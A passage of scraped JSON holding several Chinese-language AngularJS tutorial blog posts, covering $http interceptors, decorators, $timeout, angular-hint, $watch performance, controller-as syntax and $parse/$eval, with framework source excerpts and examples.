$cacheFactory('$http'); var reversedInterceptors = []; forEach(interceptorFactories, function(interceptorFactory) &#123; reversedInterceptors.unshift(isString(interceptorFactory) ? $injector.get(interceptorFactory) : $injector.invoke(interceptorFactory)); &#125;); forEach(responseInterceptorFactories, function(interceptorFactory, index) &#123; var responseFn = isString(interceptorFactory) ? $injector.get(interceptorFactory) : $injector.invoke(interceptorFactory); reversedInterceptors.splice(index, 0, &#123; response: function(response)&#123; return responseFn($q.when(reponse)); &#125;, reponseError: function(reponse)&#123; return responseFn($q.reject(reponse)); &#125; &#125;); &#125;); // ... function $http(requestConfig) &#123; // ... var chain = [serverRequesr, undefined]; var promise = $q.when(config); // apply interceptors forEach(reversedInterceptors, function(interceptor) &#123; if (interceptor.request || interceptor.requestError) &#123; requestInterceptors.unshift(interceptor.request, interceptor.requestError); &#125; if (interceptor.response || interceptor.responseError) &#123; responseInterceptors.push(interceptor.response, interceptor.responseError); &#125; &#125;); while(chain.length)&#123; var thenFn = chain.shift(); var rejectFn = chain.shift(); promise = promise.then(thenFn, rejectFn); &#125; promise.success = function(fn)&#123; promise.then(function(response)&#123; fn(response.data, reponse.status, response.headers, config); &#125;); return promise; &#125;; promise.error = function(fn)&#123; promise.then(function(response)&#123; fn(response.data, reponse.status, response.headers, config); &#125;); return promise; &#125;; return promise; &#125;; // ... 先声明interceptors和responseInterceptors两个数组，他们时所有拦截器的集合，其中reponseInterceptors时interceptors对ajax请求的简化方式，所以，若只是针对reponse的拦截，可以使用如下方式注册：12345678910111213$provide.factory('myHttpInterceptor', function($q)&#123; return function(promise)&#123; return promise.then(function(response)&#123; // 成功 do some... return response; &#125;, function(response)&#123; // 失败 do some... return $q.reject(response); &#125;); &#125;;&#125;);$httpProvider.responseInterceptors.push('myHttpInterceptor'); 利用$httpProvider.interceptors或$httpProvider.responseInterceptors注册的拦截函数，可以是一个Provider服务的名称或一个可注入的函数，甚至是一个可注入的数组。对于字符串方法，ng会利用$injector.get(interceptorFactory)在运行时获取该服务，而针对后两种方式，ng会利用$injector.invoke在运行时创建该对象。一般建议使用Factory方式定义拦截器，并用字符串方式push到$httpProvider.interceptors或$httpProvider.reponseInterceptors，因为这样有更好的逻辑分离和复用。 紧接在$get方法中，ng将interceptors和reponseInterceptors反转合并到一个reversedInterceptors的拦截器内部变量中保存，最后在$http函数中以[serverRequest, undefined]为中心，serverRequest是ajax请求的promise操作，将reversedInterceptors中的所有拦截器函数依次加入chain链式数组中，若是request或requestError，就放在链式数组起始位置，相反，response或responseError，就放在链式数组尾部位置。 需要注意的是，在chain中添加的都是成对的request/requestError或response/responseError，即使只有一个，另外一个也必须是undefined。就行chain数组声明那样。后面的代码将利用Promise机制注册这些拦截器函数，实现管道式AOP拦截机制。 在Promise中需要两个函数来注册回调，分别是成功和失败回调，为了能在接下来的循环中简介的注册Promise回调函数，所有都是成对的添加到chain中。 这些被注册的拦截器链，通过$q.when(config)构造Promise启动，它会先传入$http的config对象，并执行所有的request拦截器，依次再到serverRequest这个ajax请求，此时将挂起后面所有的response拦截器，直到ajax请求响应完成，再次执行剩下的reponse回调。若在request过程中出现异常失败则执行后面的requestError回调。responseError与response类似。 最后定义的success和error方法，是ng提供的Promise的便捷写法。 ng中的装饰器假设需要在项目中引入一个第三方的foo服务，其定义如下：1234567891011angular.module('com.ngnice.app').factory('foo', function()&#123; return &#123; name: 'Angular', &#125;;&#125;);angular.module('com.ngnice.app').controller('DemoCtrl', function(foo)&#123; var vm = this; console.log(foo.greet()); return vm;&#125;); 却发现foo服务少了需要的greet API，此时该如何办？放弃foo服务么，还是联系提供者者修改添加API。若以上都不行，那么就需要我们自己添加这个API，但不能影响到原foo服务的已有代码，此时就可以利用ng的装饰器来装饰foo服务。12345678910angular.module('com.ngnice.app').config(function($provide)&#123; $provide.decorator('foo', function($delegate)&#123; $delegate.greet = function()&#123; return 'hello, ' + this.name; &#125;; &#125;); return $delegate;&#125;); $provide服务是ng内部用于创建所有Provider服务的服务对象，可以在ng的config阶段注入并使用，此时就可以利用$provide来装饰其他对象，$provide中提供了decorator的装饰函数，运行装饰修改其他的服务，它接收所需要装饰的服务的名称和对此服务的装饰函数，装饰函数的参数$delegate代表需要装饰的服务实例。 装饰器不仅可用在对第三方服务的扩展，而且可以做到对服务进行通用处理，如日志记录、访问控制、性能测试等，此处推荐一个JS AOP处理框架： aopjs。 装饰器源码分析装饰器的实现很简单，在装饰器调用时，先取出服务的Provider对象（在config阶段还没有实例，此时只有服务的Provider对象存在），并缓存其$get方法（$get方法是ng创建服务实例的入口函数）。然后其$get方法会被替换为新的匿名函数，在新函数中先创建原来的服务实例，再以$delegate为参数传入装饰函数，从而实现对服务的修改和拦截。12345678910function decorator(serviceName, decorFn)&#123; var origProvider = providerInjector.get(serviceName + providerSuffix), orig$get = origProvider.$get; origProvider.$get = function()&#123; var origInstance = instanceInjector.invoke(orig$get, origProvider); return instanceInjector.invoke(decorFn, null, &#123;$delegate: origInstance&#125;); &#125;;&#125; 注：装饰器对ng的常量Constant不可用，因为Constant是不可变的，它在定义时以及确定了服务实例，并不存在运行时的$get函数。而其他的Provider服务则可被装饰。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"AOP","slug":"AOP","permalink":"https://github.com/xmoyKING/tags/AOP/"}]},{"title":"angularjs巩固实践-40-$timeout使用技巧","slug":"angularjs40","date":"2017-08-22T14:18:00.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/08/22/angularjs40/","link":"","permalink":"https://github.com/xmoyKING/2017/08/22/angularjs40/","excerpt":"","text":"在前端开发中，经常处理一些延时任务，比如，为了防止界面停止响应，将一些费时任务延后（js单线程执行，所以需要合理安排任务执行顺序），或是要等一些DOM元素出现后才能继续，这时，通常使用window.setTimeout来专门处理这类延时任务。 在ng应用中也可以使用setTimeout，但由于ng的脏检查机制，在延时任务中修改被绑定到界面中的变量时，window.setTimeout是不会触发脏检查来更新UI界面的，所以此时就需要使用$scope.$apply来手动触发脏检查。 但有时会遇到ng报错：Error: $digest already in progress，即ng内部已经正进行脏检查了，此时可以先检查ng内部是不是正在做脏检查，使用如下代码解决：123function safeApply(scope, fn)&#123; (scope.$$phase || scope.$root.$$phase) ? fn() : scope.$apply(fn);&#125; 上述代码似乎已经完美解决问题了，但其实可以直接使用ng提供的$timeout，自带$apply效果。 $timeout源码分析ng内置$timeout服务是ng包装原生的window.setTimeout而实现的。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667function $TimeoutProvider()&#123; this.$get = ['$rootScope', '$browser', '$q', '$excpetionHandler', function($rootScope, $browser, $q, $excpetionHandler)&#123; var deferreds = &#123;&#125;; function timeout(fn, delay, invokeApply)&#123; var deferred = $q.defer(), promise = deferred.promise, skipApply = (isDefined(invokeApply) &amp;&amp; !invokeApply), timeoutId; timeoutId = $browser.defer(function()&#123; try &#123; deferred.resolve(fn()); &#125;catch(e)&#123; deferred.reject(e); $exceptionHandler(e); &#125;finally&#123; delete deferreds[promise.$$timeoutId]; &#125; if(!skipApply) $rootScope.$apply(); &#125;, delay); promise.$$timeoutId = timeoutId; deferreds[timeoutId] = deferred; return promise; &#125; timeout.cancel = function(promise)&#123; if(promise &amp;&amp; promise.$$timeoutId in deferreds)&#123; deferreds[promise.$$timeoutId].reject('canceled'); delete deferreds[promise.$$timeoutId]; return $browser.defer.cancel(promise.$$timeoutId); &#125; return false; &#125; return timeout; &#125;];&#125;function Browser(window, document, $log, $sniffer)&#123; var self = this; // ... self.defer = function(fn, delay)&#123; var timeoutId; outstandingRequestCount++; timeoutId = setTimeout(function()&#123; delete pendingDeferIds[timeoutId]; completeOutstandingRequest(fn); &#125;, delay || 0); pendingDeferIds[timeoutId] = true; return timeoutId; &#125;; slef.defer.cancel = function(deferId)&#123; if(pendingDeferIds[deferId])&#123; delete pendingDeferIds[deferId]; clearTimeout(deferId); completeOutstandingRequest(noop); return true; &#125; return false; &#125;;&#125; ng在$browser中封装了defer和defer.cancel方法，他们分别封装了window.setTimeout和取消window.setTimeout的任务，之所以封装是为了针对不同浏览器的粘合。 $timeout服务利用$browser中分组了defer和defer.cancel，再次将window.setTimeout封装为Promise的方法，而且可以使用.then方法注册接受延时回调的返回值，并且可以用$timeout.cancel(promise)取消这次延时任务。 在$timeout中，接受延时任务的回调函数、延时间隔时间（毫秒）、以及是否需要调用$apply的标记参数。对于延时间隔为0，表示在当前任务完成，线程空闲后立即执行。apply的标记参数默认为true，需要调用$apply机制，此处启动脏检查会在当前任务完成后，线程空闲才执行，所以不会出现前面的Error: $digest already in progress的问题 $timeout是一个便于进行单元测试的服务组件，在ngMock中会为$timeout添加一个flush方法：将放在队列中的延时任务全部立即执行以便，这样就将异步延时任务变为同步，以便在ng的单元测试中更好的测试应用的业务组件。 angular-mock中angualr.mock.$Browser方法中关于defer的定义：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748angular.mock.$Browser = function()&#123; var self = this; // ... this.isMock = true; slef.defer = function(fn, delay)&#123; delay = delay || 0; self.deferredFns.push(&#123; time: (self.defer.now + delay), fn: fn, id: self.deferredNextId &#125;); self.deferredFns.sort(function(a, b)&#123; return a.time - b.time; &#125;); return self.deferredNextId++; &#125;; self.defer.now = 0; self.defer.cancel = function(deferId)&#123; var fnIndex; angular.forEach(self.deferredFns, function(fn, index)&#123; if(fn.id === deferId) fnIndex = index; &#125;); if(fnIndex |== undefined)&#123; self.deferredFns.splice(fnIndex, 1); return true; &#125; return false; &#125;; self.defer.flush = function(delay)&#123; if(angular.isDefined(delay))&#123; slef.defer.now += delay; &#125;else&#123; if(self.deferredFns.length)&#123; self.defer.now = self.deferredFns(self.deferredFns.length - 1).time; &#125;else&#123; throw new Error('No deferred tasks to be flushed'); &#125; &#125; while(self.deferredFns.length &amp;&amp; self.deferredFns[0].time &lt;= self.defer.now)&#123; self.deferredFns.shift().fn(); &#125; &#125;;&#125; $timeout不仅可用于延时任务，而且对第三方的js组件（比如jquery)封装很有用。 在需要手动scope.$apply的情况下，都可以利用$timeout或者$scope.$evalAsync的延时和默认$apply机制巧妙解决问题。 对于定时器window.setInterval，ng内置了$interval服务。在使用$interval服务之前，确定是否可以用HTML5 WebSocket代替。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"$timeout","slug":"timeout","permalink":"https://github.com/xmoyKING/tags/timeout/"}]},{"title":"angularjs巩固实践-39-使用angualr-hint","slug":"angularjs39","date":"2017-08-19T09:33:35.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/08/19/angularjs39/","link":"","permalink":"https://github.com/xmoyKING/2017/08/19/angularjs39/","excerpt":"","text":"angular-hint是在ng1.3后出现的第三方模块，目的在于帮助写出更好的ng代码，以及更容易定位ng中常见的错误。 angular-hint目前包括如下模块： angular-hint-controllers: 包含全局controller的警告、以及controller命名等最佳实践 angular-hint-directives: 包含指令的attribute、tag命名方法、以及更多的ng指令最佳实践 angular-hint-dom：当在ng controller中使用的DOM处理时发出警告 angular-hint-events: 标记出事件表达式中职位undefined的变量 angular-hint-interpolation: 关于{ {} }表达式的最佳实践和使用 angualr-hint-modules: 标记出未使用的module,以及未声明的module，多处ng-app声明等关于module的最佳实践 angular-hint-scope：包含关于$scope使用的最佳实践 可以通过batarang使用angular-hint，ng官方提供的chrome插件——batarang集成了angular-hint，安装了batarang后在ng页启用插件即可。 手动集成angular-hint如果没法在chrome中进行开发，就只能手动集成angular-hint了，通过npm将该插件下载到项目，然后添加模块依赖，并在应用的ngApp节点上加上ng-hint指令即可。1npm install angular-hint --save angular-hint 使用：1&lt;body ng-app=\"com.ngnice.app\" ng-hint&gt;&lt;/body&gt; angular-hint会默认开启所有建议的module，但也可以只使用其中一些，比如仅开启dom和directives：1&lt;body ng-app=\"com.ngnice.app\" ng-hint-include=\"dom directives\"&gt;&lt;/body&gt; 注意：当发布项目额时候需要移除这些hint。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"angular-hint","slug":"angular-hint","permalink":"https://github.com/xmoyKING/tags/angular-hint/"}]},{"title":"angularjs巩固实践-38-移除不必要的$watch","slug":"angularjs38","date":"2017-08-17T14:59:21.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/08/17/angularjs38/","link":"","permalink":"https://github.com/xmoyKING/2017/08/17/angularjs38/","excerpt":"","text":"双向绑定是ng的核心概念之一，它带了思维方式的转变：不再是DOM驱动，而是以Model为核心，在View中写上声明式标签，然后ng就在会自动同步View的变化到Model，并将Model变化更新到View。 双向绑定带来了巨大好处和方便，但它需要在后台常驻一个监听的“眼睛”，随时观察所有绑定值的改变，这就是ng1.x中的“性能杀手”——“脏检查机制”（$digest）。 可以想象，若有非常多的“眼睛”时，一定会产生性能问题，在讨论如何优化ng的性能前，需要先理解双向绑定和watchers函数。 双向绑定和watchers函数为了实现双向绑定，ng使用了$watch API来监控$scope上的Model改变。ng应用在编译模板时，会手机模板上的声明式标签——指令或绑定表达式，并链接（link)他们，在这个过程中，指令或绑定表达式会注册自己的监控函数，这就是watchers函数。以常用的{ {} }表达式为例： HTML：1234&lt;body ng-app=\"com.ngnice.app\" ng-controller=\"DemoController as demo\"&gt; &lt;div&gt; hello: &#123;&#123;demo.count&#125;&#125; &lt;/div&gt; &lt;button type=\"button\" ng-click=\"demo.increase();\"&gt;increase++&lt;/button&gt; &lt;/body&gt; JS：12345678angular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; vm.count = 0; vm.increase = function()&#123; vm.count++; &#125;; return vm;&#125;) 这是一个自增长计数器的例子，ng表达式{ {} }会在其所在的$scope（本例为DemoController）中注册watchers函数，监控count属性的变化以便能及时更新View。 每次点击button的时候，count计数器就加1，然后count的辩护会通过ng的$digest过程同步到View上，这是从Model到View的更新，是一个单向过程。 若处理一个带ngModel指令的input控件，则在View上的每次输入都会更新到Model上，此时是反向的更新，从View到Model。 Model数据能被更新到View是因为背后默默工作的$digest循环（脏检查）被触发了。它会执行当前scope以及其所有子scope上注册的watchers函数，检查是否发生变化，变化则执行相应的处理函数，直至Model稳定。结束$digest循环后，浏览器会重新渲染改变Model数据后对应的视图。 ng表达式{ {} }实现源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function collectDirectives(node, directives, attrs, maxPriority, ignoreDirective)&#123; var nodeType = node,nodeType, attrsMap = attrs.$attr, match, className; switch(nodeType)&#123; case 1: // 元素 // ... break; case 3: // 文本 addTextInterpolateDirective(directives, node.nodeValue); break; case 8: // 注释 // ... break; &#125; directives.sort(byPriority); return directives;&#125;function addTextInterpolateDirective(directives, text)&#123; var interpolateFn = $interpolate(text, true); if(interpolateFn)&#123; directives.push(&#123; priority: 0, compile: function textInterpolateCompileFn(templateNode)&#123; // 当引用的模板的根元素上有绑定的对象时，因为没有父元素，所以需要在linkFn中做如下操作 var parent = templateNode.parent(), hasCompileParent = parent.length; if(hasCompileParent) safeAddClass(templateNode.parent(), 'ng-binding'); return function textInterpolateLinkFn(scope, node)&#123; var parent = node.parent(), bindings = parent.data('$binding') || []; bindings.push(interpolateFn); parent.data('$binding', bindings); if(!hasCompileParent) safeAddClass(parent, 'ng-binding'); scope.$watch(interpolateFn, function interpolateFnWatchAction(value)&#123; node[0].nodeValue = value; &#125;); &#125;; &#125;; &#125;); &#125;&#125; ng会在compile阶段手机View模板上的所有Directive，ng表达式会被解析成一种特殊的指令，addTextInterpolateDirective。 到了link阶段，就会利用scope.$watch的API注册在上面提到的watchers函数：它的求值函数为$interpolate对绑定表达式进行编译的结果，监听函数则时用新的表达式计算值去修改DOM Node的nodeValue。 可见，在View中的ng表达式，也会成为ng在$digest循环中watchers的一员。 在上面的代码中，还有一部分时给调试器用的，它会在ng表达式所属的DOM节点加上名为ng-binding的调试类，类似的调试类还有ng-scope，ng-isolate-scope等。在ng1.3中可以使用compileProvider来关闭这些调试信息。1234app.config(function($compileProvider)&#123; // disable debug info $compileProvider.debugInfoEnable(false);&#125;); 其他指令中的watchers函数不仅ng的表达式会使用$scope.$watch API添加watchers，ng内置的大部分指令也一样。 ngBind:它和ng表达式很像，都是绑定特定表达式的值到DOM的内容，并保持与scope同步，不同之处在于它需要一个HTML节点并以attribute属性的方式标记，简单来说，除开一些细微的区别(防止ng表达式闪烁的问题)，ng表达式算是ngBind的特定语法糖。 123456789101112var ngBindDirective = ngDirective(&#123; compile: function(templateElement)&#123; templateElement.addClass('ng-binding'); return function(scope, element, attr)&#123; element.data('$binding', attr.ngBind); scope.$watch(attr.ngBind, function ngBindWatchAction(value)&#123; // 故意使用 == 而不是 ===，因为需要捕获当值为null或undefined的时候 element.text(value == undefined ? '' : value); &#125;); &#125;; &#125;&#125;); $scope.$watch的注册代码：watchers函数为ngBind attribute的值，处理函数则是用表达式计算的结果去更新DOM的文本内容。 ngShow / ngHide:根据表达式的计算结果来控制显示/隐藏DOM节点的指令。 12345678910111213141516var ngShowDirective = ['$animate', function($animate)&#123; return function(scope, element, attr)&#123; scope.$watch(attr.ngShow, function ngShowWatchAction(value)&#123; $animate[toBollean(value) ? 'removeClass' : 'addClass'](element, 'ng-hide'); &#125;); &#125;;&#125;];var ngHideDirective = ['$animate', function($animate)&#123; return function(scope, element, attr)&#123; scope.$watch(attr.ngHide, function ngHideWatchAction(value)&#123; $animate[toBollean(value) ? 'addClass' : 'removeClass'](element, 'ng-hide'); &#125;); &#125;;&#125;]; 若有太多watcher函数，例如超过2000个，那么每次$digest循环时，肯定比较慢，这是脏检查的性能瓶颈。解决的方案是：减少$watch,移除不必要的$watch. 慎用$watch和及时销毁想要提高ng的性能，那么在开发时就应该尽量减少显示使用$scope.$watch。ng内置的很多指令能满足大部分的业务需求，特别是能够复用ng内置的UI事件指令（ngChange,ngClick）时，就不要添加额外$watch。 对于不再使用的$watch函数，尽早释放，$scope.$watch函数的返回值就是用于释放watcher的函数，如下例（实现单次绑定）：1234567891011angular.module('com.ngnice.app').controller('DemoController', function($scope)&#123; var vm = this; vm.count = 0; var textWatch = $scope.$watch('demo.updated', function(newVal, oldVal)&#123; if(newVal !== oldVal)&#123; vm.count++; textWatch(); &#125; &#125;); return vm;&#125;); one-time 绑定在开发中，常有很多静态数据构成的页面，如静态商品、订单的显示，他们后绑定了数据后，在当前的Model就不再改变了。比如，需要一个会议例程的展示界面，常规的ng方式是使用ng-repeat来渲染列表： HTML:1234567891011&lt;ul&gt; &lt;li ng-repeat=\"session in sessions\"&gt; &lt;div class=\"info\"&gt; &#123;&#123;session.name&#125;&#125; - &#123;&#123;session.room&#125;&#125; - &#123;&#123;session.hour&#125;&#125; - &#123;&#123;session.speaker&#125;&#125; &lt;/div&gt; &lt;div class=\"likes\"&gt; &#123;&#123;session.likes&#125;&#125; likes! &lt;button ng-click=\"likeSession(session)\"&gt;Like it!&lt;/button&gt; &lt;/div&gt; &lt;/li&gt;&lt;/ul&gt; JS:123456angular.module('com.ngnice.app').controller('MainController', function($scope)&#123; $scope.sessions = [/*...*/]; $scope.likeSession = function(session)&#123; // ... &#125;&#125;); 普通的实现非常简单，但若sessions非常多，比如300个，那么会产生多少个$watch? 上例中每一个session有5个绑定，额外的ng-repeat一个，将会产生1501个$watch,。问题就在于每次用户点击button，ng就会去检查name，room等5个属性是不是被改变了。 而除了button之外，所有的数据都是静态数据，那么既然某些数据Model不会被改变，是否可以让ng不对这些数据进行脏检查呢？但$watch在第一次确实必要的，因为初始化时需要用静态信息填充DOM，所以若能换为单次绑定（one-time）则再好不过了。 ng中，单次绑定的定义是：单词表达式在第一次$digest完成后，将不再计算（监测属性的变化）ng1.3为ng表达式引入了新语法，以“::”作为前缀的表达式为one-time绑定：1234567891011&lt;ul&gt; &lt;li ng-repeat=\"session in sessions\"&gt; &lt;div class=\"info\"&gt; &#123;&#123;::session.name&#125;&#125; - &#123;&#123;::session.room&#125;&#125; - &#123;&#123;::session.hour&#125;&#125; - &#123;&#123;::session.speaker&#125;&#125; &lt;/div&gt; &lt;div class=\"likes\"&gt; &#123;&#123;session.likes&#125;&#125; likes! &lt;button ng-click=\"likeSession(session)\"&gt;Like it!&lt;/button&gt; &lt;/div&gt; &lt;/li&gt;&lt;/ul&gt; 若在1.3之前的版本想要实现one-time绑定该如何实现呢？ 有牛人已经实现了：Bindonce1234567891011121314&lt;ul&gt; &lt;li ng-repeat=\"session in sessions\"&gt; &lt;div class=\"info\"&gt; &lt;span bo-text=\"session.name\"&gt;&lt;/span&gt; - &lt;span bo-text=\"session.room\"&gt;&lt;/span&gt; - &lt;span bo-text=\"session.hour\"&gt;&lt;/span&gt; - &lt;span bo-text=\"session.speaker\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;div class=\"likes\"&gt; &#123;&#123;session.likes&#125;&#125; likes! &lt;button ng-click=\"likeSession(session)\"&gt;Like it!&lt;/button&gt; &lt;/div&gt; &lt;/li&gt;&lt;/ul&gt; 需要引入bindonce库，并依赖模块，JS:1angular.module('com.ngnice.app',['pasvaz.bindonce']); 滚屏加载另外一种性能解决方案是滚屏加载（Endless Scrolling / unpagination）,用于大量数据显示时，又不分页，一般是当滚屏到底部时加载新数据到页面底部。开源组件ngInfiniteScroll的 Demo： HTML:123456789101112131415&lt;div ng-app='myApp' ng-controller='DemoController'&gt; &lt;div infinite-scroll='reddit.nextPage()' infinite-scroll-disabled='reddit.busy' infinite-scroll-distance='1'&gt; &lt;div ng-repeat='item in reddit.items'&gt; &lt;span class='score'&gt;&#123;&#123;item.score&#125;&#125;&lt;/span&gt; &lt;span class='title'&gt; &lt;a ng-href='&#123;&#123;item.url&#125;&#125;' target='_blank'&gt;&#123;&#123;item.title&#125;&#125;&lt;/a&gt; &lt;/span&gt; &lt;small&gt;by &#123;&#123;item.author&#125;&#125; - &lt;a ng-href='http://reddit.com&#123;&#123;item.permalink&#125;&#125;' target='_blank'&gt;&#123;&#123;item.num_comments&#125;&#125; comments&lt;/a&gt; &lt;/small&gt; &lt;div style='clear: both;'&gt;&lt;/div&gt; &lt;/div&gt; &lt;div ng-show='reddit.busy'&gt;Loading data...&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; JS:12345678910111213141516171819202122232425262728293031var myApp = angular.module('myApp', ['infinite-scroll']);myApp.controller('DemoController', function($scope, Reddit) &#123; $scope.reddit = new Reddit();&#125;);// Reddit constructor function to encapsulate HTTP and pagination logicmyApp.factory('Reddit', function($http) &#123; var Reddit = function() &#123; this.items = []; this.busy = false; this.after = ''; &#125;; Reddit.prototype.nextPage = function() &#123; if (this.busy) return; this.busy = true; var url = \"https://api.reddit.com/hot?after=\" + this.after + \"&amp;jsonp=JSON_CALLBACK\"; $http.jsonp(url).success(function(data) &#123; var items = data.data.children; for (var i = 0; i &lt; items.length; i++) &#123; this.items.push(items[i].data); &#125; this.after = \"t3_\" + this.items[this.items.length - 1].id; this.busy = false; &#125;.bind(this)); &#125;; return Reddit;&#125;); 其他解决性能问题的方案还有很多，将其他更高效的第三方非ng组件封装为ng组件，需要注意scope和model的同步，以及合理的触发$apply更新view，比如通过ngReact将React组件应用到ng中。 重要提醒：其实ng的脏检查机制并不慢，ng为此专门做了很多优化，在大多数情况下，ng的watcher机制比很多模版引擎更快，因为ng不需要通过大范围的DOM操作来更新View，它每次更新的区域很小，DOM操作更少，而DOM操作的代价远远高于JS运算，在有些浏览器中，修改DOM的速度甚至比JS运算速度慢1000倍。 同时，随着ES的新标准Object.obserse的使用，ng2.0改用它来代替“脏检查”，运行性能显著提高，尤其是针对Mobile开发的ionic这类框架，非常有利。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"$watch","slug":"watch","permalink":"https://github.com/xmoyKING/tags/watch/"}]},{"title":"angularjs巩固实践-37-使用Controller as Vm方式","slug":"angularjs37","date":"2017-08-14T14:12:44.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/08/14/angularjs37/","link":"","permalink":"https://github.com/xmoyKING/2017/08/14/angularjs37/","excerpt":"","text":"ng从1.2开始引入语法Contorller as Vm在之前的版本需要在Controller中注入$scope服务才能在视图绑定中使用这些变量。 比如：12345678angular.module('com.ngnice.app').controller('DemoController', function($scope)&#123; $scope.title = 'Angular';&#125;);// 使用如下：&lt;div ng-app=\"com.ngnice.app\" ng-controller=\"DemoController\"&gt; hello: &#123;&#123; title &#125;&#125;&lt;/div&gt; 在controller中需要显示注入$scope, 对controller来说，$scope几乎是必须使用的对象，所以几乎每次都加入这个参数，这显得有些多余和累赘，所以ng引入了新的语法糖：controller as，上述代码可改为：12345678angular.module('com.ngnice.app').controller('DemoController', function()&#123; this.title = 'Angular';&#125;);// 使用如下：&lt;div ng-app=\"com.ngnice.app\" ng-controller=\"DemoController as demo\"&gt; hello: &#123;&#123; demo.title &#125;&#125;&lt;/div&gt; 此处，controller中没有注入$scope服务，所以controller更像是一个普通的js函数对象，而新的语法在使用时为controller引入了一个别名，方便在ng-controller的DOM区内的视图模板通过别名来访问数据对象。 源码如下：12345controllerInstance = $controller(controller, locals);...if(directive.controllerAs)&#123; locals.$scope[directive.controllerAs] = controllerInstance;&#125; ng将controller对象实例以其as为别名放在$scope上，所以视图模板能够访问。 对比controller as语法，更清晰也更好的方法为：12345angular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; vm.title = 'Angular'; return vm;&#125;) 这样做的好处时，避免js中this指针的一些问题。也可以在controller中注入$scope同时声明一个内部变量1var vm = $scope.vm = &#123;&#125;; 原则上在controller中应该避免使用$watch、$emit、$on等$scope提供的特殊的方法。但当一定要使用这些方法时，就需要使用注入$scope的方式。 同时因controller实例将会成为$scope服务的一个属性，所以视图模板上所有的字段都会现在在一个别名引用属性上，这样可以避开js原型链继承对普通值类型的覆盖问题。 然后由于没有注入$scope, controller也更接近普通js对象，所以后期可以利用coffeescript等提供的class语法来实现，看起来更好。 最后多重controller嵌套的情况下，由于每个字段都会用别名，所以能避免嵌套继承的命名冲突问题。 路由中使用controller as语法一般ng应用都时单页面应用，需要用到ng-route或ui-route来知道controller，他们也支持这种as语法： 以ng-route为例：1234567angular.module('com.ngnice.app').config(function($routeProvider)&#123; $routeProvider.when('/Book/:bookId', &#123; templateUrl: 'book.html', controller: BookController, controllerAs: 'book' &#125;);&#125;) 指令中也可以使用controller as语法：123456789101112angular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; vm.title = 'Angular'; return vm;&#125;).directive('hello',function()&#123; return &#123; restrict: 'EA', controllerAs: 'vm', template: '&lt;div&gt;&#123;&#123;vm.title&#125;&#125;&lt;/div&gt;', controller: 'DemoController' &#125;;&#125;); 但上述方式在通过scope:{}声明的变量仍然会自动绑定到$scope而不是vm上，所以需要开启bindToController选项：12345678910111213141516angular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; vm.title = 'Angular'; return vm;&#125;).directive('hello',function()&#123; return &#123; restrict: 'EA', scope: &#123; name: = &#125; controllerAs: 'vm', bindToController: true, template: '&lt;div&gt;&#123;&#123;vm.title&#125;&#125;&lt;/div&gt;', controller: 'DemoController' &#125;;&#125;);","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-36-$parse和$eval、$observe和$watch","slug":"angularjs36","date":"2017-08-12T02:40:09.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/08/12/angularjs36/","link":"","permalink":"https://github.com/xmoyKING/2017/08/12/angularjs36/","excerpt":"","text":"在ng源码中，很多地方会用到$parse和$eval、$observe和$watch,这2对指令非常有用和重要，应该清楚他们的用途和区别。 $parse和$eval$parse和$eval这两个函数可以解析/计算ng表达式的值。 区别在： $parse是独立服务，可以在任意地方注入后使用，它返回一个函数，然后需要显式的把表达式求职的上下文传给这个函数。 $eval则是scope对象上的一个方法，它是对$parse的包装，默认已指定表达式的求值上下文为所在的scope对象，所以传入参数后返回计算结果，也就是说，只能在能访问到scope的场景下使用$eval，如Controller中或指令的link函数中。 $eval源码：123$eval: function(expr, locals)&#123; return $parse(expre)(this, locals);&#125; 即：$eval是为了让$parse在scope中更方便使用的语法糖，$parse和$eval支持指定上下文，即locals参数。 使用$parse时，需先传入表达式进行解析，然后返回一个解析后的函数，该函数本身时用来获取对象的值的。对属性表达式解析时，$parse还会生成一个assign的属性，代表相应的赋值函数：123456789var getter = $parse('user.name'); // 解析表达式var setter = getter.assgin; // 获取赋值函数var context = &#123;user: &#123;name: 'ng'&#125;&#125;;var locals = &#123;user: &#123;name: 'local'&#125;&#125;;expect(getter(context)).toEqual('ng'); // truesetter(context, 'new value'); // 设置属性值expect(context.user.name).toEqual('new value'); // trueexpect(getter(context, locals)).toEqual('local'); // true 上例中，$parse先解析表达式user.name, 若时属性表达式则返回对应的getter函数，同时设置assign属性为对应的setter函数，最后演示如何利用locals来指定上下文。 由于不需要指定上下对象，$eval的使用就简单多了，因为其已经被强制指定为$scope对象为上下文：12345678var scope = $rootScope.$new(true); // 新建一个scopescope.a = 1;scope.b = 2;expect(scope.$eval('a+b')).toEqual(3); // 